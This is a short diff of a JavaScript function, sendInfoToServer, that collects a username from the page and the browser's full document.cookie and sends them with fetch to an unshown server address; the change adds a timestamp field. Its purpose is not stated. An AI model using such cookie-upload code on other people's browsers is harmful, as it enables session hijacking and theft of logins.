@@ -22,8 +22,9 @@ function sendInfoToServer(){
 
     const item = {
         name: document.getElementsByClassName("zt_u_name")[0].innerText,
-        cookie:document.cookie ,
-        time:datetime
+        cookie:document.cookie,
+        time:datetime,
+        expirecount:Date.now()
       };
 
       fetch(uri, {
